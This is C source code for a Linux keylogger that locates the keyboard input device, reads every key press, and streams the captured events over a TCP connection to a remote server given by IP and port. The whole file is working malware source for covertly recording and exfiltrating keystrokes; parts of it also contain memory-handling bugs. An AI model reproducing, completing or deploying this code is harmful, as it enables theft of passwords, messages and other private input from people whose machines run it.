/* Developed by Fabio Cinicolo */

#include <stdlib.h>
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <syslog.h>
#include <string.h>
#include <errno.h>
#include <signal.h>
#include <netdb.h>
#include <stdint.h>
#include <linux/input.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <sys/stat.h>
#include <dirent.h>
#include "keylogger.h"

int STOP_KEYLOGGER = 0;

void startKeylogger(int keyboard, int fd)
{
    ssize_t to_write;
    size_t event_size = sizeof(event);
    event *kbd_events;
    struct sigaction sa;

    sa.sa_flags = 0;
    sa.sa_handler = &sigHandler;

    sigaction(SIGTERM, &sa, NULL);
    sigaction(SIGPIPE, &sa, NULL);

    kbd_events = malloc(sizeof(event) * MAX_EVENTS);

    syslog(LOG_INFO, "Keylogging started..");

    while (!STOP_KEYLOGGER) /* If server closed connection and write failed (SIGPIPE), user sent SIGTERM or another IO error occurred we stop keylogging */
    {
        to_write = read(keyboard, kbd_events, event_size * MAX_EVENTS);
        if (to_write < 0) /* If read was interrupted by SIGTERM or another error occurred we stop keylogging */
            goto end;
        else
        {
            size_t j = 0;
            for (size_t i = 0; i < to_write / event_size; i++) /* For each event read */
            {
                if (kbd_events[i].type == EV_KEY && kbd_events[i].value == KEY_PRESSED) /* If a key has been pressed.. */
                    kbd_events[j++] = kbd_events[i];                                    /*  Add the event to the beginning of the array */
            }
            if (writeEventsIntoFile(fd, kbd_events, j * event_size) < 0)
                goto end;
        }
    }
end:
    syslog(LOG_ERR, "Shutting down keylogger, cause: %s", strerror(errno));
    close(fd);
    close(keyboard);
    free(kbd_events);
    return;
}

void sigHandler(int signum)
{
    STOP_KEYLOGGER = 1;
}

int writeEventsIntoFile(int fd, struct input_event *events, size_t to_write)
{
    ssize_t written;
    do
    {
        written = write(fd, events, to_write);
        if (written < 0) /* It can fail with EPIPE (If server closed socket) or with EINTR if it is interrupted by a signal before any bytes were written */
            return -1;   /* If it is interrupted by a signal after at least one byte was written, it returns the number of bytes written */
        events += written;
        to_write -= written;
    } while (to_write > 0);
    return 0;
}

int findKeyboardDevice(char *dir_path)
{

    struct dirent *file;
    DIR *dir;
    struct stat file_info;
    char *file_path;

    if ((dir = opendir(dir_path)) < 0)
    {
        syslog(LOG_ERR, "Couldn't open %s: %s", dir_path, strerror(errno));
        return -1;
    }

    while ((file = readdir(dir)) != NULL) /* We need to check every file of the directory */
    {

        if (!strcmp(file->d_name, ".") || !strcmp(file->d_name, "..")) /* We skip . and .. directories */
            continue;

        file_path = malloc(strlen(file->d_name) + strlen(dir_path) + 1);
        strcpy(file_path, dir_path);
        strcat(file_path, file->d_name); /* Concatenating dir path to current file name */

        struct stat file_info;

        if (lstat(file_path, &file_info) < 0) /* Getting current file info */
        {
            syslog(LOG_ERR, "Couldn't get %s info: %s", file_path, strerror(errno));
            continue;
        }
        if (!S_ISDIR(file_info.st_mode)) /* If current file is not a directory.. */
        {
            if (S_ISCHR(file_info.st_mode)) /* .. if it is a character device .. */
            {
                int keyboard_fd;
                if (isKeyboardDevice(file_path, &keyboard_fd)) /* .. and it is a keyboard device, we return its file descriptor */
                {
                    syslog(LOG_ERR, "Keyboard device driver found: %s", file_path);
                    free(file_path);
                    return keyboard_fd;
                }
            }
        }
        else /* If file is a directory.. */
        {
            char *path_with_slash = malloc(strlen(file_path) + 2);
            strncpy(path_with_slash, file_path, strlen(file_path));
            path_with_slash[strlen(file_path)] = '/'; /* Appending a slash to the path */
            path_with_slash[strlen(file_path) + 1] = '\0';
            int kbd_fd = findKeyboardDevice(path_with_slash); /* .. recursive call over this directory to check for its files */
            if (kbd_fd != -1)
            {
                free(file_path);
                free(path_with_slash);
                return kbd_fd; /* Propagate descriptor to previous calls */
            }
        }
    }

    free(file_path);
    return -1;
}

int isKeyboardDevice(char *path, int *keyboard_device)
{
    int32_t events_bitmask = 0;
    int32_t keys_bitmask = 0;
    int32_t keys = KEY_Q | KEY_A | KEY_Z | KEY_1 | KEY_9;
    int fd;

    fd = open(path, O_RDONLY);

    if (fd < 0)
        syslog(LOG_ERR, "Couldn't open %s: %s", path, strerror(errno));

    if (ioctl(fd, EVIOCGBIT(0, sizeof(events_bitmask)), &events_bitmask) >= 0) /* Getting bit events supported by device */
    {
        if ((events_bitmask & EV_KEY) == EV_KEY) /* If EV_KEY bit is set then it could be a Keyboard, 
                                                    but it can be a false positive (for example, power button has this bit set but it is not a kbd) */
        {
            if (ioctl(fd, EVIOCGBIT(EV_KEY, sizeof(keys_bitmask)), &keys_bitmask) >= 0)
                if ((keys & keys_bitmask) == keys) /* If it support those keys then good chances are that we just found the keyboard device */
                {
                    *keyboard_device = fd;
                    return 1;
                }
        }
    }
    close(fd);
    return 0;
}

int openConnectionWithServer(char *ip, short port)
{
    int sock_fd;
    struct hostent *host_info;
    struct sockaddr_in server;

    if ((host_info = gethostbyname(ip)) == NULL) /* Translating hostname into Ip address */
        return -1;

    sock_fd = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP); /* Opening Tcp socket */
    if (sock_fd < 0)
        return -1;

    bzero(&server, sizeof(server));

    server.sin_family = AF_INET;
    server.sin_addr = *((struct in_addr *)host_info->h_addr);
    server.sin_port = htons(port);

    if (connect(sock_fd, (struct sockaddr *)&server, sizeof(server)) < 0) /* Connecting to server */
        return -1;

    return sock_fd;
}
